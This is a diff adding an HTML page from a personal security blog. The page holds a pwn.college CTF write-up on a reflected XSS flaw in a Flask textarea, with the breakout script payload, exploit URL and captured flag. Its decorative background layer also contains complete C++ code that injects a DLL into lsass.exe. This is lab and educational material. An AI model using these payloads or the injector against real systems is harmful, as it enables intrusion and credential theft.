@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🛡️ XSS 4 — Writeup</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="🛡️ XSS 4 — Writeup" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>🛡️ XSS 4 — Writeup</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-challenge-information">📁 Challenge Information</h2>
+
+<ul>
+  <li><strong>Category</strong>: Web Exploitation</li>
+  <li><strong>Challenge Name</strong>: XSS 4</li>
+  <li><strong>Platform</strong>: pwn.college</li>
+  <li><strong>Tags</strong>: <code class="language-plaintext highlighter-rouge">XSS</code>, <code class="language-plaintext highlighter-rouge">Reflected</code>, <code class="language-plaintext highlighter-rouge">Textarea Injection</code>, <code class="language-plaintext highlighter-rouge">Script Injection</code>, <code class="language-plaintext highlighter-rouge">JavaScript</code>, <code class="language-plaintext highlighter-rouge">DOM</code></li>
+</ul>
+
+<hr />
+
+<h2 id="-description">🔍 Description</h2>
+
+<p>We are given a Flask web app that displays a message entered in a <code class="language-plaintext highlighter-rouge">&lt;textarea&gt;</code> tag through the <code class="language-plaintext highlighter-rouge">msg</code> query parameter. Our goal is to inject JavaScript into the rendered HTML page and trigger an alert box to capture the flag.</p>
+
+<hr />
+
+<h2 id="-source-code">📜 Source Code</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/opt/pwn.college/python
+</span>
+<span class="kn">import</span> <span class="n">flask</span>
+<span class="kn">import</span> <span class="n">os</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">challenge_get</span><span class="p">():</span>
+    <span class="k">return</span> <span class="sa">f</span><span class="sh">"""</span><span class="s">
+        &lt;html&gt;&lt;body&gt;
+        &lt;h1&gt;pwnmsg ephemeral message service&lt;/h1&gt;
+        The message:
+        &lt;form&gt;
+            &lt;textarea name=msg&gt;</span><span class="si">{</span><span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sh">"</span><span class="s">msg</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Type your message here</span><span class="err">!</span><span class="sh">"</span><span class="s">)</span><span class="si">}</span><span class="s">&lt;/textarea&gt;
+            &lt;input type=submit value=</span><span class="sh">"</span><span class="s">Make URL!</span><span class="sh">"</span><span class="s">&gt;
+        &lt;/form&gt;
+        &lt;/body&gt;&lt;/html&gt;
+    </span><span class="sh">"""</span>
+
+
+<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">"</span><span class="s">SERVER_NAME</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">challenge.localhost:80</span><span class="sh">"</span>
+<span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="sh">"</span><span class="s">challenge.localhost</span><span class="sh">"</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-vulnerability-analysis">🧠 Vulnerability Analysis</h2>
+
+<p>The key vulnerability here lies in the way user input is directly embedded inside a <code class="language-plaintext highlighter-rouge">&lt;textarea&gt;</code> tag <strong>without any sanitization or escaping</strong>:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">msg</span><span class="nt">&gt;</span>{user-controlled-input}<span class="nt">&lt;/textarea&gt;</span>
+</code></pre></div></div>
+
+<p>This allows us to <strong>break out</strong> of the <code class="language-plaintext highlighter-rouge">&lt;/textarea&gt;</code> context and inject our own HTML/JavaScript content.</p>
+
+<hr />
+
+<h2 id="-exploit">🎯 Exploit</h2>
+
+<p>By closing the existing <code class="language-plaintext highlighter-rouge">&lt;textarea&gt;</code> tag and inserting a <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> block, we can execute arbitrary JavaScript code in the victim’s browser.</p>
+
+<h3 id="-payload">✅ Payload:</h3>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;/textarea&gt;&lt;script&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">PWNED</span><span class="dl">"</span><span class="p">)</span><span class="nt">&lt;/script&gt;&lt;textarea&gt;</span>
+</code></pre></div></div>
+
+<h3 id="-full-url">🔗 Full URL:</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://challenge.localhost/?msg=&lt;/textarea&gt;&lt;script&gt;alert("PWNED")&lt;/script&gt;&lt;textarea&gt;
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-execution">🚀 Execution</h2>
+
+<p>We use the <code class="language-plaintext highlighter-rouge">/challenge/victim</code> command to simulate a visit by a vulnerable user or bot:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hacker@web-security~xss-4:~<span class="nv">$ </span>/challenge/victim <span class="s1">'http://challenge.localhost/?msg=&lt;/textarea&gt;&lt;script&gt;alert("PWNED")&lt;/script&gt;&lt;textarea&gt;'</span>
+</code></pre></div></div>
+
+<p>This results in:</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Visiting http://challenge.localhost/?msg=&lt;/textarea&gt;&lt;script&gt;alert("PWNED")&lt;/script&gt;&lt;textarea&gt;
+Alert triggered! Your reward:
+pwn.college{Ysj7zmjBRnYiY7FcGZ1v35gxDuU.QX1kzMzwSM0IzMyEzW}
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-flag">🏁 Flag</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college{Ysj7zmjBRnYiY7FcGZ1v35gxDuU.QX1kzMzwSM0IzMyEzW}
+</code></pre></div></div>
+
+<hr />
+
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
